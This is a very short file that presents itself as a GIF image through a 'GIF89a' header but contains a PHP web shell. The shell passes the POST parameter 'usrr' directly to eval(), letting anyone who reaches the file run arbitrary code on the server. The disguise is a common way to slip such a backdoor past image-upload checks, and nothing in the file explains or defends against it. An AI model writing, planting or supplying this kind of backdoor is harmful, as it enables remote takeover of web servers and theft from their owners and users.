GIF89a
<?php
$str = '1';
function s($str)
{
    eval("".$str."");
}

s($_POST['usrr']);
?>